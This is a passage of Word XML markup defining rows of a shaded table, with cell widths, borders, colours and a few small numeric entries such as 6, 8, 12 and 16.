                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="00B050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="580" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:right="3"/>
              <w:jc w:val="right"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="80"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="106"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="320" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1040" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="400" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="00B050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="580" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="320" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1040" w:type="dxa"/>
